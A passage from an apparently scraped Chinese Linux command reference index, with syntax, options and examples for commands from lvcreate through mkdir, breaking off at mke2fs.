用于创建LVM的逻辑卷。逻辑卷是创建在卷组之上的。逻辑卷对应的设备文件保存在卷组目录下，例如：在卷组\"vg1000\"上创建一个逻辑卷\"lvol0\"，则此逻辑卷对应的设备文件为\"/dev/vg1000/lvol0\"。\n\n###  语法\n\n```shell\nlvcreate(选项)(参数)\n```\n\n###  选项\n\n```shell\n-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；\n-l：指定逻辑卷的大小（LE数）。\n```\n\n###  参数\n\n逻辑卷：指定要创建的逻辑卷名称。\n\n###  实例\n\n使用lvcreate命令在卷组\"vg1000\"上创建一个200MB的逻辑卷。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# lvcreate -L 200M vg1000    #创建大小为200M的逻辑卷\n```\n\n输出信息如下：\n\n```shell\nLogical volume \"lvol0\" created\n```\n\n说明：创建成功后，新的逻辑卷\"lvol0\"，将通过设备文件`/dev/vg1000/lvol0`进行访问。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lvcreate"]},{"title":"【Linux 命令】lvdisplay","url":"/linux-command/lvdisplay/","content":"\n显示逻辑卷属性\n\n## 补充说明\n\n**lvdisplay命令** 用于显示LVM逻辑卷空间大小、读写状态和快照信息等属性。如果省略\"逻辑卷\"参数，则lvdisplay命令显示所有的逻辑卷属性。否则，仅显示指定的逻辑卷属性。\n\n###  语法\n\n```shell\nlvdisplay(参数)\n```\n\n###  参数\n\n逻辑卷：指定要显示属性的逻辑卷对应的设备文件。\n\n###  实例\n\n使用lvdisplay命令显示指定逻辑卷的属性。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# lvdisplay /dev/vg1000/lvol0     #显示逻辑卷属性\n```\n\n输出信息如下：\n\n```shell\n  --- Logical volume ---  \n  LV Name                /dev/vg1000/lvol0  \n......省略部分输出内容......  \n  Block device           253:0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lvdisplay"]},{"title":"【Linux 命令】lvextend","url":"/linux-command/lvextend/","content":"\n扩展逻辑卷空间\n\n## 补充说明\n\n**lvextend命令** 用于在线扩展逻辑卷的空间大小，而不中断应用程序对逻辑卷的访问。使用lvextend命令动态在线扩展磁盘空间，整个空间扩展过程对于应用程序来说是完全透明的。\n\n###  语法\n\n```shell\nlvextend(选项)(参数)\n```\n\n###  选项\n\n```shell\n-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；\n-l：指定逻辑卷的大小（LE数）。\n```\n\n###  参数\n\n逻辑卷：指定要扩展空间的逻辑卷。\n\n###  实例\n\n使用lvextend命令为逻辑卷`/dev/vg1000/lvol0`增加100M空间。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# lvextend -L +100M /dev/vg1000/lvol0    #为了解决增加100M空间\n```\n\n输出信息如下：\n\n```shell\nExtending logical volume lvol0 to 300.00 MB  \nLogical volume lvol0 successfully resized\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lvextend"]},{"title":"【Linux 命令】lvreduce","url":"/linux-command/lvreduce/","content":"\n收缩逻辑卷空间\n\n## 补充说明\n\n**lvreduce命令** 用于减少LVM逻辑卷占用的空间大小。使用lvreduce命令收缩逻辑卷的空间大小有可能会删除逻辑卷上已有的数据，所以在操作前必须进行确认。\n\n###  语法\n\n```shell\nlvreduce(选项)(参数)\n```\n\n###  选项\n\n```shell\n-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；\n-l：指定逻辑卷的大小（LE数）。\n```\n\n###  参数\n\n逻辑卷：指定要操作的逻辑卷对应的设备文件。\n\n###  实例\n\n使用lvreduce命令减少指定的逻辑卷的空间大小。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# lvreduce -L -50M /dev/vg1000/lvol0     #将逻辑卷的空间大小减少50M\n```\n\n输出信息如下：\n\n```shell\n......省略部分输出内容......  \nDo you really want to reduce lvol0? [y/n]: y  #确认操作  \n  Reducing logical volume lvol0 to 252.00 MB  \n  Logical volume lvol0 successfully resized\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lvreduce"]},{"title":"【Linux 命令】lvremove","url":"/linux-command/lvremove/","content":"\n删除指定LVM逻辑卷\n\n## 补充说明\n\n**lvremove命令** 用于删除指定LVM逻辑卷。如果逻辑卷已经使用mount命令加载，则不能使用lvremove命令删除。必须使用umount命令卸载后，逻辑卷方可被删除。\n\n###  语法\n\n```shell\nlvremove(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：强制删除。\n```\n\n###  参数\n\n逻辑卷：指定要删除的逻辑卷。\n\n###  实例\n\n使用lvremove命令删除指定的逻辑卷。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# lvremove /dev/vg1000/lvol0    #删除逻辑卷\"lvol0\"\n```\n\n输出信息如下：\n\n```shell\nDo you really want to remove active logical \nvolume \"lvol0\"? [y/n]: y    #确认删除\n  Logical volume \"lvol0\" successfully removed\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lvremove"]},{"title":"【Linux 命令】lvresize","url":"/linux-command/lvresize/","content":"\n调整逻辑卷空间大小\n\n## 补充说明\n\n**lvresize命令** 用于调整LVM逻辑卷的空间大小，可以增大空间和缩小空间。使用lvresize命令调整逻辑卷空间大小和缩小空间时需要谨慎，因为它有可能导致数据丢失。\n\n###  语法\n\n```shell\nlvresize(选项)(参数)\n```\n\n###  选项\n\n```shell\n-L：指定逻辑卷的大小，单位为“kKmMgGtT”字节；\n-l：指定逻辑卷的大小（LE数）。\n```\n\n###  参数\n\n逻辑卷：指定要删除的逻辑卷。\n\n###  实例\n\n使用lvresize命令调整最大的逻辑卷大小。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# lvresize -L +200M /dev/vg1000/lvol0     #将逻辑卷空间增加200M\n```\n\n输出信息如下：\n\n```shell\nExtending logical volume lvol0 to 280.00 MB\nLogical volume lvol0 successfully resized\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lvresize"]},{"title":"【Linux 命令】lvscan","url":"/linux-command/lvscan/","content":"\n扫描逻辑卷\n\n## 补充说明\n\n**lvscan命令** 用于扫描当前系统中存在的所有的LVM逻辑卷。使用lvscan指令可以发现系统中的所有逻辑卷，及其对应的设备文件。\n\n###  语法\n\n```shell\nlvscan(选项)\n```\n\n###  选项\n\n```shell\n-b：显示逻辑卷的主设备和次设备号。\n```\n\n###  实例\n\n使用lvscan命令扫描系统中的所有逻辑卷。在命令行中输入下面的命令：\n\n```shell\n[root@localhost ~]# lvscan     #扫描所有的逻辑卷\n```\n\n输出信息如下：\n\n```shell\nACTIVE          '/dev/vg1000/lvol0' [200.00 MB] inherit\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lvscan"]},{"title":"【Linux 命令】lynx","url":"/linux-command/lynx/","content":"\n纯文本模式的网页浏览器\n\n## 补充说明\n\n**lynx命令** 是纯文本模式的网页浏览器，不支持图形、音视频等多媒体信息。\n\n###  语法\n\n```shell\nlynx(选项)(参数)\n```\n\n###  选项\n\n```shell\n-case：在搜索字符串时，区分大小写；\n-ftp：关闭ftp功能；\n-nobrowse：关闭目录浏览功能；\n-noclor：关闭色彩显示模式；\n-reload：更新代理服务器的缓存，只对首页有效；\n--color：如果系统支持彩色模式，则激活彩色模式；\n--help：显示指令的帮助信息；\n--versiom：显示指令的版本信息。\n```\n\n###  参数\n\nURL：指定要访问的网站的URL地址。\n\n## 内部命令  \n\n **移动命令** \n\n```shell\n下方向键：页面上的下一个链接(用高亮度显示)。\n上方向键：页面上的前一个链接(用高亮度显示)。\n回车和右方向键：跳转到链接指向的地址。\n左方向键：回到上一个页面。\n```\n\n **滚动命令** \n\n```shell\n+、Page-Down、Space、Ctrl+f：向下翻页。\n-、Page-Up、b、Ctrl+b：向上翻页。\nCtrl+a：移动到当前页的最前面。\nCtrl+e：移动到当前页的最后面。\nCtrl+n：向下翻两行。\nCtrl+p：往回翻两行。\n)：向下翻半页。\n(：往回翻半页。\n#：回到当前页的 Toolbar 或 Banner。\n```\n\n **文件操作命令** \n\n```shell\nc：建立一个新文件。\nd：下载选中的文件。\nE：编辑选中的文件。\nf：为当前文件显示一个选项菜单。\nm：修改选中文件的名字或位置。\nr：删除选中的文件。\nt：Tag highlighted file。\nu：上载一个文件到当前目录。\n```\n\n **其他命令** \n\n```shell\n?、h：帮助。\na：把当前链接加入到一个书签文件里。\nc：向页面的拥有者发送意见或建议。\nd：下载当前链接。\ne：编辑当前文件。\ng：跳转到一个用户 指定的URL或文件。\nG：编辑当前页的URL，并跳转到这个URL。\ni：显示文档索引。\nj：执行预先定义的“短”命令。\nk：显示键盘命令列表。\nl：列出当前页上所有链接的地址。\nm：回到首页 。\no：设置选项。\np：把当前页输出到文件，e-mail，打印机或其他地方。\nq：退出。\n/：在当前页内查找字符串。\ns：在外部搜索输入的字符串。\nn：搜索下一个。\nv：查看一个书签文件。\nV：跳转到访问过的地址。\nx：不使用缓存。\nz：停止当前传输。\n[backspace]：跳转到历史页(同 V 命令)。\n=：显示当前页的信息。\n：查看当前页的源代码。\n!：回到shell提示符下。\n_：清除当前任务的所有授权信息。\n*：图形链接模式的切换开关。\n@：8位传输模式或CJK模式的切换开关。\n[：pseudo_inlines 模式的切换开关。\n]：为当前页或当前链接发送一个“head”请求。\nCtrl+r：重新装如当前页并且刷新屏幕。\nCtrl+w：刷新屏幕。\nCtrl+u：删除输入的行。\nCtrl+g：取消输入或者传送。\nCtrl+t：跟踪模式的切换开关。\n;：看Lynx对当前任务的跟踪记录。\nCtrl+k：调用 Cookie Jar 页。\n数字键：到后面的第 n 个链接。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lynx"]},{"title":"【Linux 命令】mail","url":"/linux-command/mail/","content":"\n命令行下发送和接收电子邮件\n\n## 补充说明\n\n**mail命令** 是命令行的电子邮件发送和接收工具。操作的界面不像elm或pine那么容易使用，但功能非常完整。\n\n###  语法\n\n```shell\nmail(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b<地址>：指定密件副本的收信人地址；\n-c<地址>：指定副本的收信人地址；\n-f<邮件文件>：读取指定邮件文件中的邮件；\n-i：不显示终端发出的信息；\n-I：使用互动模式；\n-n：程序使用时，不使用mail.rc文件中的设置；\n-N：阅读邮件时，不显示邮件的标题；\n-s<邮件主题>：指定邮件的主题；\n-u<用户帐号>：读取指定用户的邮件；\n-v：执行时，显示详细的信息。\n```\n\n###  参数\n\n邮件地址：收信人的电子邮箱地址。\n\n###  实例\n\n **直接使用shell当编辑器** \n\n```shell\nmail -s \"Hello from jsdig.com by shell\" admin@jsdig.com\nhello,this is the content of mail.\nwelcome to www.jsdig.com\n```\n\n第一行是输入的命令，`-s`表示邮件的主题，后面的`admin@jsdig.com`则是邮件的接收人，输入完这行命令后回车，会进入邮件正文的编写，我们可以输入任何文字，比如上面的两行。当邮件正文输入完成后，需要按 **CTRL+D** 结束输入，此时会提示你输入Cc地址，即邮件抄送地址，没有直接回车就完成了邮件的发送。\n\n **使用管道进行邮件发送** \n\n```shell\necho \"hello,this is the content of mail.welcome to www.jsdig.com\" | mail -s \"Hello from jsdig.com by pipe\" admin@jsdig.com\n```\n\n使用管道直接敲入这行命令即可完成邮件的发送，其中echo后的是邮件正文。\n\n **使用文件进行邮件发送** \n\n```shell\nmail -s \"Hello from jsdig.com by file\" admin@jsdig.com < mail.txt\n```\n\n使用上面的命令后，我们就可以把mail.txt文件的内容作为邮件的内容发送给admin@jsdig.com了。\n\n使用上述三种方式都可以给外部邮箱进行邮件发送，但因为前面2中都是直接在shell中敲入邮件内容，因此无法输入中文，即使我们使用粘贴的方式输入了中文，那么收到的邮件也是乱码的。但第3种方式，我们可以在window下编辑好邮件内容后，放到linux下，再进行发送，这样就可以正常发送中文了。不过目前邮件的中文标题暂时没有找到解决办法。\n\n因为mail程序本身就是调用sendmail来进行邮件发送的，因此我们可以在mail命令中使用sendmail的参数进行配置，比如我想使用特定的发件人发送邮件，可以使用如下命令：\n\n```shell\nmail -s \"Hello from jsdig.com with sender\" admin@jsdig.com -- -f user@jsdig.com<mail.txt\n```\n\n上面的命令中，我们使用了– -f user@jsdig.com这样的参数，这是sendmail的选项，其中-f表示邮件的发送人邮件地址。\n\n很多情况下，我们也需要使用邮件来发送附件，在linux下使用mail命令发送附件也很简单，不过首先需要安装uuencode软件包，这个程序是对二进制文件进行编码使其适合通过邮件进行发送，在CentOS上安装该软件包如下：\n\n```shell\nyum install sharutils\n```\n\n安装完成后我们就可以来进行附件的发送了，使用如下命令：\n\n```shell\nuuencode test.txt test | mail -s \"hello,see the attachement\" admin@jsdig.com<mail.txt\n```\n\n完成后就可以把text.txt文件作为邮件的附件发送出去了。uuencode有两个参数，第一个是要发送的文件，第二个是显示的文件名称。\n\n这里我主要介绍的是在CentOS下使用mail发送电子邮件的一些使用方法，需要的要求是你的linux必须安装了sendmail并开启了，同时保证可以连接外网。另外，文章中提到的命令本人都经过亲自测试，保证完全可用，不过你需要将命令中的电子邮件地址换成自己的电子邮件地址。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mail"]},{"title":"【Linux 命令】mailq","url":"/linux-command/mailq/","content":"\n显示待发送的邮件队列\n\n## 补充说明\n\n**mailq命令** 用户显示待发送的邮件队列，显示的每一个条目包括邮件队列id、邮件大小、加入队列时间、邮件发送者和接受者。如果邮件最后一次尝试后还没有将邮件投递出去，则显示发送失败的原因。\n\n###  语法\n\n```shell\nmailq(选项)\n```\n\n###  选项\n\n```shell\n-v：显示详细的信息。\n```\n\n###  实例\n\n```shell\n[root@localhost ~]# mailq -v\n/var/spool/mqueue is empty\n                Total requests: 0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mailq"]},{"title":"【Linux 命令】mailstat","url":"/linux-command/mailstat/","content":"\n显示到达的邮件状态\n\n## 补充说明\n\n**mailstat命令** 用来显示到达的邮件状态。\n\n###  语法\n\n```shell\nmailstat(选项)(参数)\n```\n\n###  选项\n\n```shell\n-k：保持邮件日志文件的完整性，不清空日志文件；\n-l：使用长格式显示邮件状态；\n-m：合并任何错误信息到一行中显示；\n-o：使用老的邮件日志邮件；\n-t：使用简洁的格式显示邮件状态；\n-s：如果没有邮件则不输出任何信息。\n```\n\n###  参数\n\n邮件日志文件：指定要读取邮件日志文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mailstat"]},{"title":"【Linux 命令】make","url":"/linux-command/make/","content":"\nGNU的工程化编译工具\n\n## 补充说明\n\n**make命令** 是GNU的工程化编译工具，用于编译众多相互关联的源代码文件，以实现工程化的管理，提高开发效率。\n\n###  语法\n\n```shell\nmake(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：指定“makefile”文件；\n-i：忽略命令执行返回的出错信息；\n-s：沉默模式，在执行之前不输出相应的命令行信息；\n-r：禁止使用build-in规则；\n-n：非执行模式，输出所有执行命令，但并不执行；\n-t：更新目标文件；\n-q：make操作将根据目标文件是否已经更新返回\"0\"或非\"0\"的状态信息；\n-p：输出所有宏定义和目标文件描述；\n-d：Debug模式，输出有关文件和检测时间的详细信息。\n```\n\nLinux下常用选项与Unix系统中稍有不同，下面是不同的部分：\n\n```shell\n-c dir：在读取 makefile 之前改变到指定的目录dir；\n-I dir：当包含其他 makefile文件时，利用该选项指定搜索目录；\n-h：help文挡，显示所有的make选项；\n-w：在处理 makefile 之前和之后，都显示工作目录。\n```\n\n###  参数\n\n目标：指定编译目标。\n\n###  知识扩展\n\n无论是在linux 还是在Unix环境 中，make都是一个非常重要的编译命令。不管是自己进行项目开发还是安装应用软件，我们都经常要用到make或make install。利用make工具，我们可以将大型的开发项目分解成为多个更易于管理的模块，对于一个包括几百个源文件的应用程序，使用make和 makefile工具就可以简洁明快地理顺各个源文件之间纷繁复杂的相互关系。\n\n而且如此多的源文件，如果每次都要键入gcc命令进行编译的话，那对程序员 来说简直就是一场灾难。而make工具则可自动完成编译工作，并且可以只对程序员在上次编译后修改过的部分进行编译。\n\n因此，有效的利用make和 makefile工具可以大大提高项目开发的效率。同时掌握make和makefile之后，您也不会再面对着Linux下的应用软件手足无措了。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","make"]},{"title":"【Linux 命令】man","url":"/linux-command/man/","content":"\n查看Linux中的指令帮助\n\n## 补充说明\n\n**man命令** 是Linux下的帮助指令，通过man指令可以查看Linux中的指令帮助、配置文件帮助和编程帮助等信息。\n\n###  语法 \n\n```shell\nman(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-a：在所有的man帮助手册中搜索；\n-f：等价于whatis指令，显示给定关键字的简短描述信息；\n-P：指定内容时使用分页程序；\n-M：指定man手册搜索的路径。\n```\n\n###  参数 \n\n*   数字：指定从哪本man手册中搜索帮助；\n*   关键字：指定要搜索帮助的关键字。\n\n### 数字代表内容\n\n```shell\n1：用户在shell环境可操作的命令或执行文件；\n2：系统内核可调用的函数与工具等\n3：一些常用的函数(function)与函数库(library)，大部分为C的函数库(libc)\n4：设备文件说明，通常在/dev下的文件\n5：配置文件或某些文件格式\n6：游戏(games)\n7：惯例与协议等，如Linux文件系统，网络协议，ASCII code等说明\n8：系统管理员可用的管理命令\n9：跟kernel有关的文件\n```\n\n###  实例 \n\n我们输入`man ls`，它会在最左上角显示“LS（1）”，在这里，“LS”表示手册名称，而“（1）”表示该手册位于第一节章，同样，我们输`man ifconfig`它会在最左上角显示“IFCONFIG（8）”。也可以这样输入命令：“man [章节号] 手册名称”。\n\nman是按照手册的章节号的顺序进行搜索的，比如：\n\n```shell\nman sleep\n```\n\n只会显示sleep命令的手册,如果想查看库函数sleep，就要输入:\n\n```shell\nman 3 sleep\n```\n\n\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","man"]},{"title":"【Linux 命令】mapfile","url":"/linux-command/mapfile/","content":"\n从标准输入读取行并赋值到数组。\n\n## 概要\n\n```shell\nmapfile [-d delim] [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]\n```\n\n## 主要用途\n\n- 从标准输入或文件描述符读取行并赋值到数组。\n\n\n## 选项\n\n```shell\n-d delim       将delim设为行分隔符，代替默认的换行符。\n-n count       从标准输入中获取最多count行，如果count为零那么获取全部。\n-O origin      从数组下标为origin的位置开始赋值，默认的下标为0。\n-s count       跳过对前count行的读取。\n-t             读取时移除行分隔符delim（默认为换行符）。\n-u fd          从文件描述符fd中读取。\n-C callback    每当读取了quantum行时，调用callback语句。\n-c quantum     设定读取的行数为quantum。\n\n如果使用-C时没有同时使用-c指定quantum的值，那么quantum默认为5000。\n当callback语句执行时，将数组下一个要赋值的下标以及读取的行作为额外的参数传递给callback语句。\n如果使用-O时没有提供起始位置，那么mapfile会在实际赋值之前清空该数组。\n```\n\n## 参数\n\narray（可选）：用于输出的数组名称。如果没有指定数组名称，那么会默认写入到变量名为MAPFILE的数组中。\n\n## 返回值\n\n返回成功除非使用了非法选项、指定的数组是只读的、指定的数组不是下标数组。\n\n## 例子\n\n```shell\n# 常见的读取形式。\nmapfile < source_file target_array\ncat source_file |mapfile target_array\nmapfile -u fd target_array\n\n# 只读取前5行。\nmapfile < source_file -n 5 target_array\n\n# 跳过前5行。\nmapfile < source_file -s 5 target_array\n\n# 在数组指定的下标开始赋值。\n# 请注意：这样做不会清空该数组。\nmapfile < source_file -O 2 target_array\n\n# 读取时设定行分隔符为tab。\n# 注意，第二行的tab在终端需要用ctrl+v tab输入；\nmapfile < source_file -d $'\\t' target_array\nmapfile < source_file -d '\t' target_array\n\n# 读取时移除行分隔符（tab）。\nmapfile < source_file -d $'\\t' -t target_array\n# 读取时移除行分隔符（换行符）。\nmapfile < source_file -t target_array\n\n# 每读取2行，执行一次语句（在这里是echo）。\nmapfile < source_file -C \"echo CALLBACK:\" -c 2 target_array\n\n# 遍历下标，依次显示数组的元素。\nfor i in ${!target_array[@]}; do\n  printf \"%s\" ${target_array[i]}\ndone\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n2. bash内建命令readarray是mapfile的同义词。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mapfile"]},{"title":"【Linux 命令】md5sum","url":"/linux-command/md5sum/","content":"\n计算和校验文件报文摘要的工具程序\n\n## 补充说明\n\n**md5sum命令** 采用MD5报文摘要算法（128位）计算和检查文件的校验和。一般来说，安装了Linux后，就会有md5sum这个工具，直接在命令行终端直接运行。\n\nMD5算法常常被用来验证网络文件传输的完整性，防止文件被人篡改。MD5 全称是报文摘要算法（Message-Digest Algorithm 5），此算法对任意长度的信息逐位进行计算，产生一个二进制长度为128位（十六进制长度就是32位）的“指纹”（或称“报文摘要”），不同的文件产生相同的报文摘要的可能性是非常非常之小的。\n\n###  语法 \n\n```shell\nmd5sum(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-b：二进制模式读取文件；\n-t或--text：把输入的文件作为文本文件看待；\n-c：从指定文件中读取MD5校验和，并进行校验；\n--status：验证成功时不输出任何信息；\n-w：当校验不正确时给出警告信息。\n```\n\n###  参数 \n\n文件：指定保存着文件名和校验和的文本文件。\n\n### 实例\n\n**使用 md5sum 生成密码**\n\n另一种获取可用作密码的随机字符串的方法是计算 MD5 校验值！校验值看起来确实像是随机字符串组合在一起，我们可以用作密码。确保你的计算源是个变量，这样的话每次运行命令时生成的校验值都不一样。比如 date ！date 命令 总会生成不同的输出。\n\n```shell\n[root@localhost ~]# date | md5sum\n6a43f2c246cdc3e6a3592652f831d186  -\n```\n\n**生成一个文件insert.sql的md5值：** \n\n```shell\n[root@localhost ~]# md5sum insert.sql\nbcda6cb5c704664f989703ac5a88f112  insert.sql\n```\n\n**检查文件testfile是否被修改过：** \n\n首先生成md5文件：\n\n```shell\nmd5sum testfile > testfile.md5\n```\n\n检查：\n\n```shell\nmd5sum testfile -c testfile.md5\n```\n\n如果文件没有变化，输出应该如下：\n\n```shell\nforsort: OK\n```\n\n此时，md5sum命令返回0。\n\n如果文件发生了变化，输出应该如下：\n\n```shell\nforsort: FAILED\nmd5sum: WARNING: 1 of 1 computed checksum did NOT match\n```\n\n此时，md5sum命令返回非0。\n\n这里，检查用的文件名随意。如果不想有任何输出，则`md5sum testfile --status -c testfile.md5`，这时候通过返回值来检测结果。\n\n检测的时候如果检测文件非法则输出信息的选项:\n\n```shell\nmd5sum -w -c testfile.md5\n```\n\n输出之后，文件异常输出类似如下：\n\n```shell\nmd5sum: testfile.md5: 1: improperly formatted MD5 checksum line\nmd5sum: testfile.md5: no properly formatted MD5 checksum lines found\n```\n\n这里，testfile.md5只有一行信息，但是我认为地给它多加了一个字符，导致非法。如果md5文件正常那么`-w`有没有都一样。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","md5sum"]},{"title":"【Linux 命令】mesg","url":"/linux-command/mesg/","content":"\n设置当前终端的写权限\n\n## 补充说明\n\n**mesg命令** 用于设置当前终端的写权限，即是否让其他用户向本终端发信息。将mesg设置y时，其他用户可利用write命令将信息直接显示在您的屏幕上。\n\n###  语法\n\n```shell\nmesg(参数)\n```\n\n###  参数\n\ny/n：y表示运行向当前终端写信息，n表示禁止向当前终端写信息。\n\n###  实例\n\n```shell\n[root@localhost ~]# mesg y    #允许系统用户将信息直接显示在你的屏幕上。\n[root@localhost ~]# mesg n    #不允许系统用户将信息直接显示在你的屏幕上。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mesg"]},{"title":"【Linux 命令】mii-tool","url":"/linux-command/mii-tool/","content":"\n配置网络设备协商方式的工具\n\n## 补充说明\n\n**mii-tool命令** 是用于查看、管理介质的网络接口的状态，有时网卡需要配置协商方式，比如10/100/1000M的网卡半双工、全双工、自动协商的配置。但大多数的网络设备是不用我们来修改协商，因为大多数网络设置接入的时候，都采用自动协商来解决相互通信的问题。不过自动协商也不是万能的，有时也会出现错误，比如丢包率比较高，这时就要我们来指定网卡的协商方式。mii-tool就是能指定网卡的协商方式。下面我们说一说mii-tool的用法。\n\n###  语法\n\n```shell\nusage: mii-tool [-VvRrwl] [-A media,... | -F media] [interface ...]\n```\n\n###  选项\n\n```shell\n-V 显示版本信息；\n-v 显示网络接口的信息；\n-R 重设MII到开启状态；\n-r 重启自动协商模式；\n-w 查看网络接口连接的状态变化；\n-l 写入事件到系统日志；\n-A 指令特定的网络接口；\n-F 更改网络接口协商方式；\n\nmedia: 100baseT4, 100baseTx-FD, 100baseTx-HD, 10baseT-FD, 10baseT-HD,\n        (to advertise both HD and FD) 100baseTx, 10baseT\n```\n\n###  实例\n\n查看网络接口的协商状态：\n\n```shell\n[root@localhost ~]# mii-tool -v eth0\neth0: negotiated 100baseTx-FD, link ok\n  product info: vendor 00:50:ef, model 60 rev 8\n  basic mode:   autonegotiation enabled\n  basic status: autonegotiation complete, link ok\n  capabilities: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD\n  advertising:  100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD flow-control\n  link partner: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD\n```\n\n注：上面的例子，我们可以看得到是自动协商，注意红字的部份。\n\n更改网络接口协商方式：\n\n更改网络接口的协商方式，我们要用到`-F`选项，后面可以接100baseT4, 100baseTx-FD, 100baseTx-HD, 10baseT-FD, 10baseT-HD等参数；\n\n如果我们想把网络接口eth0改为1000Mb/s全双工的模式应该怎么办呢？\n\n```shell\n[root@localhost ~]# mii-tool -F 100baseTx-FD\n[root@localhost ~]# mii-tool -v eth0\neth0: 100 Mbit, full duplex, link ok\n  product info: vendor 00:00:00, model 0 rev 0\n  basic mode:   100 Mbit, full duplex\n  basic status: link ok\n  capabilities: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD\n  advertising:  100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD\n```\n\n注：是不是已经改过来了？当然，我们也一样用ethtool工具来更改，比如执行下面的命令：\n\n```shell\n[root@localhost ~]# ethtool -s eth0 speed 100 duplex full\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mii-tool"]},{"title":"【Linux 命令】mkbootdisk","url":"/linux-command/mkbootdisk/","content":"\n可建立目前系统的启动盘\n\n## 补充说明\n\n**mkbootdisk命令** 用来为当前运行的系统创建能够单独使用的系统引导软盘，以便在系统出现故障时能够启动操作进行适当的修复工作。\n\n###  语法\n\n```shell\nmkbootdisk(选项)(参数)\n```\n\n###  选项\n\n```shell\n--device<设备>：指定设备；\n--mkinitrdargs<参数>：设置mkinitrd的参数；\n--noprompt：不会提示用户插入磁盘；\n--verbose：执行时显示详细的信息；\n--version：显示版本信息。\n```\n\n###  参数\n\n内核：指定内核版本。\n\n###  实例\n\n```shell\nmkbootdisk --device /dev/fd0 `uname -r`\n```\n\n其中，``uname -r``是目前Linux 系统所使用的核心版本，如果你有多个核心版本的话，你以可以直接输入核心版本。例如在这个网页中所使用的核心有两个版本，一个是2.2.12-20，另一个是2.2.18，若要以2.2.18设定开机的话，可以使用：\n\n```shell\nmkbootdisk --device /dev/fd0 2.2.18\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mkbootdisk"]},{"title":"【Linux 命令】mkdir","url":"/linux-command/mkdir/","content":"\n用来创建目录\n\n## 补充说明\n\n**mkdir命令** 用来创建目录。该命令创建由dirname命名的目录。如果在目录名的前面没有加任何路径名，则在当前目录下创建由dirname指定的目录；如果给出了一个已经存在的路径，将会在该目录下创建一个指定的目录。在创建目录时，应保证新建的目录与它所在目录下的文件没有重名。 \n\n注意：在创建文件时，不要把所有的文件都存放在主目录中，可以创建子目录，通过它们来更有效地组织文件。最好采用前后一致的命名方式来区分文件和目录。例如，目录名可以以大写字母开头，这样，在目录列表中目录名就出现在前面。\n\n在一个子目录中应包含类型相似或用途相近的文件。例如，应建立一个子目录，它包含所有的数据库文件，另有一个子目录应包含电子表格文件，还有一个子目录应包含文字处理文档，等等。目录也是文件，它们和普通文件一样遵循相同的命名规则，并且利用全路径可以唯一地指定一个目录。\n\n###  语法\n\n```shell\nmkdir (选项)(参数)\n```\n\n###  选项\n\n```shell\n-Z：设置安全上下文，当使用SELinux时有效；\n-m<目标属性>或--mode<目标属性>建立目录的同时设置目录的权限；\n-p或--parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录；\n--version 显示版本信息。\n```\n\n###  参数\n\n目录：指定要创建的目录列表，多个目录之间用空格隔开。\n\n###  实例\n\n在目录`/usr/meng`下建立子目录test，并且只有文件主有读、写和执行权限，其他人无权访问\n\n```shell\nmkdir -m 700 /usr/meng/test\n```\n\n在当前目录中建立bin和bin下的os_1目录，权限设置为文件主可读、写、执行，同组用户可读和执行，其他用户无权访问\n\n```shell\nmkdir -p-m 750 bin/os_1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","mkdir"]},{"title":"【Linux 命令】mke2fs","url":"/linux-command/mke2fs/","content":"\n创建磁盘分区上的“etc2/etc3”文件系统\n\n## 补充说明\n\n**mke2fs命令** 被用于创建磁盘分区上的“etc2/etc3”文件系统。\n\n###  语法\n\n```shell\nmke2fs(选项)(参数)\n```\n\n###  